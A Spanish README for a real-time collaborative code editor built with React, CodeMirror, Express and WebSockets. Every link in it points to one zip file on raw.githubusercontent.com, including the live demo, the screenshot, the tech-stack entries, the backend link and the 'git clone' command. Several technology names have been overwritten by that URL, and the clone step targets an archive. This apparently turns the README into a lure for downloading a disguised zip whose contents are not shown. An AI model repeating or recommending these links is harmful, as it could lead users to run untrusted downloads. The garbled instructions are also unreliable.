# 📝 Editor de Código Colaborativo en Tiempo Real

¡Bienvenido al Editor de Código Colaborativo! Una aplicación web full-stack que permite a múltiples usuarios unirse a salas privadas para escribir y editar código de forma sincronizada y en tiempo real.

### 🚀 [Ver Demo en Vivo](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)

---

![Screenshot del Editor Colaborativo](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)


## ✨ Características Principales

- **Colaboración en Tiempo Real:** Los cambios en el código se reflejan instantáneamente para todos los participantes en la sala gracias a WebSockets.
- **Salas Privadas:** Crea o únete a salas únicas usando un ID para tener sesiones de edición privadas.
- **Lista de Participantes en Vivo:** Una barra lateral muestra los nombres de todos los usuarios conectados a la sala, actualizándose en tiempo real.
- **Nombres de Usuario Personalizados:** Cada usuario puede elegir su nombre antes de unirse a una sesión.
- **Editor de Código Avanzado:** Se utiliza CodeMirror para ofrecer una experiencia de edición profesional con:
  - Resaltado de sintaxis para JavaScript/JSX.
  - Numeración de líneas.
  - Tema oscuro (Okaidia).
- **Interfaz de Usuario Moderna:** Diseño limpio y responsive construido con Tailwind CSS.
- **Controles de Sala:** Funcionalidades para copiar el enlace de invitación y salir de la sala de forma segura.

## 🛠️ Stack Tecnológico

### Frontend
- **Framework:** React (con Vite)
- **Estilos:** Tailwind CSS
- **Enrutamiento:** React Router DOM
- **Cliente WebSocket:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip Client
- **Editor de Código:** CodeMirror for React

### Backend
- **Entorno de Ejecución:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip
- **Framework:** Express
- **Servidor WebSocket:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip

### Despliegue
- **Frontend:** Vercel
- **Backend:** Render

## ⚙️ Configuración y Desarrollo Local

¿Quieres correr este proyecto en tu máquina local? Sigue estos pasos:

1. **Clona el repositorio:**
   ```bash
   git clone [https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)
   cd realtime-editor-client
   ```

2. **Instala las dependencias:**
   ```bash
   npm install
   ```

3. **Configura las variables de entorno:**
   - Crea un archivo `.env` en la raíz del proyecto.
   - Añade la URL de tu servidor backend local:
     ```
     VITE_BACKEND_URL=http://localhost:3001
     ```
   *(Nota: Necesitarás tener el [servidor backend](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip) corriendo localmente también).*

4. **Inicia el servidor de desarrollo:**
   ```bash
   npm run dev
   ```
   La aplicación debería estar corriendo en `http://localhost:5173`.